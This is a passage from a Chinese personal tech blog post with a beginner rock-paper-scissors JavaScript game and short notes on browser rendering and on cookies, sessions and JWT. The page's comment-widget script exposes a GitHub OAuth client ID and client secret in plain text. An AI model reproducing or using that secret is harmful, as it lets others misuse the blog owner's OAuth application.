function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    res=<span class="number">3</span>;</span><br><span class="line">    x=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>+<span class="number">1</span>);</span><br><span class="line">    pc.<span class="property">textContent</span>=map.<span class="title function_">get</span>(x);</span><br><span class="line">    me.<span class="property">textContent</span>=<span class="string">&quot;布&quot;</span>;</span><br><span class="line">    <span class="title function_">bijiao</span>(x,res);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bijiao</span>(<span class="params">p1,p2</span>)&#123;</span><br><span class="line">    tem=p1-p2;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tem);</span><br><span class="line">    <span class="keyword">if</span>(tem==-<span class="number">1</span>||tem==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        result.<span class="property">textContent</span>=<span class="string">&quot;输了嘞！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(tem==-<span class="number">2</span>||tem==<span class="number">1</span>)&#123;</span><br><span class="line">        result.<span class="property">textContent</span>=<span class="string">&quot;赢了嘞！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> result.<span class="property">textContent</span>=<span class="string">&quot;平局嘞！&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Q1:双方都要同步显示出拳结果</span></span><br><span class="line"><span class="comment">A:</span></span><br><span class="line"><span class="comment">Q2:保证电脑在我点击时随机</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231116130404318.png"></p>
<p><strong>优化版本</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> me=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#me&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> pc=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#pc&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> chuquan=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.but&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> result=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#result&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> player,computer,res;</span><br><span class="line">chuquan.<span class="title function_">forEach</span>(<span class="function"><span class="params">btn</span> =&gt;</span> btn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    player=btn.<span class="property">textContent</span>;</span><br><span class="line">    <span class="title function_">cpturn</span>();</span><br><span class="line">    <span class="comment">//console.log(btn);</span></span><br><span class="line">    <span class="comment">//console.log(player);</span></span><br><span class="line">    me.<span class="property">textContent</span>=<span class="string">`<span class="subst">$&#123;player&#125;</span>`</span>;</span><br><span class="line">    pc.<span class="property">textContent</span>=<span class="string">`<span class="subst">$&#123;computer&#125;</span>`</span>;</span><br><span class="line">    res=<span class="title function_">bijiao</span>();</span><br><span class="line">    result.<span class="property">textContent</span>=<span class="string">`展示结果：<span class="subst">$&#123;res&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">cpturn</span>(<span class="params"></span>)&#123;<span class="comment">//电脑出拳</span></span><br><span class="line">    <span class="keyword">const</span> x=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(x)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            computer=<span class="string">&quot;石头&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            computer=<span class="string">&quot;剪刀&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            computer=<span class="string">&quot;布&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bijiao</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(player==computer)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;平局啊！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(computer==<span class="string">&quot;石头&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> player==<span class="string">&quot;布&quot;</span>?<span class="string">&quot;赢了嘞！&quot;</span>:<span class="string">&quot;输了诶！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(computer==<span class="string">&quot;剪刀&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> player==<span class="string">&quot;石头&quot;</span>?<span class="string">&quot;赢了嘞！&quot;</span>:<span class="string">&quot;输了诶！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(computer==<span class="string">&quot;布&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> player==<span class="string">&quot;剪刀&quot;</span>?<span class="string">&quot;赢了嘞！&quot;</span>:<span class="string">&quot;输了诶！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="1-渲染"><a href="#1-渲染" class="headerlink" title="1.渲染"></a>1.渲染</h3><p>构建DOM-&gt;构建CSSOM-&gt;构建渲染树-&gt;布局-&gt;</p>
<h2 id="2-cookie，session，jwt"><a href="#2-cookie，session，jwt" class="headerlink" title="2.cookie，session，jwt"></a>2.cookie，session，jwt</h2><p><a target="_blank" rel="noopener" href="https://server.51cto.com/article/662998.html">https://server.51cto.com/article/662998.html</a></p>
<p>1.为什么要cookie？</p>
<p>http是无状态的协议，就是说每次访问的时候，服务器回来的信息都是没记忆的，不会专门为某个请求保留信息；每次请求之间都是单独的</p>
<p>而像购物车这种，这次保存了之后，下次登录进来还能看到存放的商品，那就要去 <strong>记录</strong> 这种用户信息</p>
<p>cookie，一种装载工具</p>
<p>每次请求都要携带这个name&#x3D;value</p>
<p>然后有个问题就是，看上面的cookie，它的<strong>字段</strong>可以<strong>有很多</strong>，一个用户还好，如果有大量用户，那就存储不了多少，所以引入了session。</p>
<p>2.session呢，诞生于服务器，存储在服务器</p>
<p>用户登录后，服务器将这些登录信息，如账号密码等，生成了一个sessionid，发送给客户端，客户端每次请求也是将这个<strong>sessionid</strong>放到cookie里，去请求，服务器再核对</p>
<p>因为每次请求都要去数据库取一下session，多了一次内部连接，消耗性能了，所以又有jwt</p>
<p>3.jwt，(json web token)</p>
<p>三部分组成，报头、载荷、签名；这个存储在客户端；</p>
<p>当服务器收到传来的token，它会取出前两部分，做一次签名与传来的签名做比对，成功就是合法的。</p>
<p>服务器<strong>不存储啊</strong></p>
<p>它具有一次性特征的，是有有效期的</p>
<p>但是并不是说jwt最好，还是各有优缺点</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://ak005469075.github.io/2023/11/08/xsskuozhan/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/12/01/web-cache/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            web_cache
          
        </div>
      </a>
    
    
      <a href="/2023/10/30/app/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">app概述</div>
      </a>
    
  </nav>

  
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">


<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>


<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '93da8388ad1469a8be66',
    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
    repo: 'blogtalk',
    owner: 'ak005469075',
    admin: ['ak005469075'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>

  
    
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023-2025
        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="是羽泪云诶"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/htb">HTB</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
  <script type="text/javascript">
$(function () {
    console.log("lets go！");
    console.log("/");
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
</div>

</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>